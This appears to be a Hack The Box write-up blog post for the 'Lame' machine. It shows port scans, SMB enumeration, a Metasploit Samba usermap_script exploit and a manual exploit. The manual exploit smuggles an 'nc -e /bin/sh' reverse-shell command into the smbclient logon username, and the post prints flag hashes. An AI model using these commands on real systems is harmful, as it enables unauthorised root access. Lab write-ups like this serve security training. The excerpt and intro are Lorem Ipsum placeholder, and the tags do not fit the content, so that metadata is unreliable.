---
layout: single
title: Lame - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-04-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-lame/lame_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-lame/lame_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------

   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@nidus:/git/thm# nmap -Pn -sC -sV -n 10.10.10.3
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 10:09 CEST
    Nmap scan report for 10.10.10.3
    Host is up (0.035s latency).
    Not shown: 996 filtered ports
    PORT    STATE SERVICE     VERSION
    21/tcp  open  ftp         vsftpd 2.3.4
    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | ftp-syst:
    |   STAT:
    | FTP server status:
    |      Connected to 10.10.14.4
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      vsFTPd 2.3.4 - secure, fast, stable
    |_End of status
    22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
    | ssh-hostkey:
    |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
    |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_clock-skew: mean: -3d00h51m31s, deviation: 2h49m45s, median: -3d02h51m34s
    | smb-os-discovery:
    |   OS: Unix (Samba 3.0.20-Debian)
    |   Computer name: lame
    |   NetBIOS computer name:
    |   Domain name: hackthebox.gr
    |   FQDN: lame.hackthebox.gr
    |_  System time: 2020-07-27T01:17:55-04:00
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_smb2-time: Protocol negotiation failed (SMB2)


2. Login in to the ftp with anonymous:anonymous we find nothing of use. Enumerate the SMB shares using smbmap and smbclient.

    root@nidus:/git/htb/lame# smbmap -H 10.10.10.3
    [+] IP: 10.10.10.3:445	Name: 10.10.10.3
            Disk                                                  	Permissions	Comment
    	----                                                  	-----------	-------
    	print$                                            	NO ACCESS	Printer Drivers
    	tmp                                               	READ, WRITE	oh noes!
    	opt                                               	NO ACCESS
    	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
    	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))

  The share tmp seems interesting, both read and write permissions - lets enumerate more there.

NOTE: If you're experiencing this error when trying to list with smbclient: "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED"
      Then go ahead and add the following two lines to /etc/samba/smb.conf under [global]:
        client min protocol = NT1
        client max protocol = SMB3

    root@nidus:/git/htb/lame# smbclient \\\\10.10.10.3\\tmp
      smb: \> ls
      .                                   D        0  Mon Jul 27 07:50:50 2020
      ..                                 DR        0  Sun May 20 20:36:12 2012
      5145.jsvc_up                        R        0  Mon Jul 27 07:17:46 2020
      .ICE-unix                          DH        0  Mon Jul 27 07:16:41 2020
      .X11-unix                          DH        0  Mon Jul 27 07:17:08 2020
      .X0-lock                           HR       11  Mon Jul 27 07:17:08 2020

  There's nothing of direct use for us in here either. Instead we change the approach and look for known samba vulnerabilities.


3. Using searchsploit we look for any direct vulnerabilities of Samba version 3.0.20.

    root@nidus:/git/htb/lame# searchsploit samba 3.0.20
      ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
       Exploit Title                                                                                                              |  Path
      ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
      ..
      Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                            | unix/remote/16320.rb
      ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------

  Direct we find a msf module available. Turns out this module gives us instant root. Grab root.txt and user.txt

    msf5 auxiliary(scanner/ssh/ssh_enumusers) > use exploit/multi/samba/usermap_script
    msf5 exploit(multi/samba/usermap_script) > set lhost 10.10.14.4
    msf5 exploit(multi/samba/usermap_script) > set rhost 10.10.10.3
    msf5 exploit(multi/samba/usermap_script) > run

      [*] Started reverse TCP handler on 10.10.14.4:4444
      [*] Command shell session 1 opened (10.10.14.4:4444 -> 10.10.10.3:46617) at 2020-07-30 10:53:52 +0200

      whoami
        root
      pwd
        /
      cat /root/root.txt
        92caac3be140ef409e45721348a4e9df
      ls -al /home
        total 24
        drwxr-xr-x  6 root    root    4096 Mar 14  2017 .
        drwxr-xr-x 21 root    root    4096 May 20  2012 ..
        drwxr-xr-x  2 root    nogroup 4096 Mar 17  2010 ftp
        drwxr-xr-x  2 makis   makis   4096 Mar 14  2017 makis
        drwxr-xr-x  2 service service 4096 Apr 16  2010 service
        drwxr-xr-x  3    1001    1001 4096 May  7  2010 user
      cat /home/makis/user.txt
        69454a937d94f5f0225ea00acd2e84c5


4. OPTIONAL MANUAL EXPLOIT (NO MSF)

Logging in as anonymous user on the smb-service we find that 'logon' option is available.
We can exploit this directly to get a reverse shell.

  (a) Verify options with '?' or 'help'
    smbclient \\\\10.10.10.3\\tmp\\
    smb: \> ?
      [..]
      wdel           logon          listconnect    showconnect    tcon

  (b) Setup a reverse shell to your box
    smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.10 4488`"
      Password:
      session setup failed: NT_STATUS_IO_TIMEOUT

  (c) Grab the incomming session
    [root:/git/htb/lame]# nc -lvnp 4488                                                                                               (master✱)
    listening on [any] 4488 ...
    connect to [10.10.14.10] from (UNKNOWN) [10.10.10.3] 58543
      whoami
      root
      python -c 'import pty;pty.spawn("/bin/bash")';
      root@lame:/root# cat root.txt
        cat root.txt
        744e9fa96f4e8423020ccb841c60e4d2

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. -


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
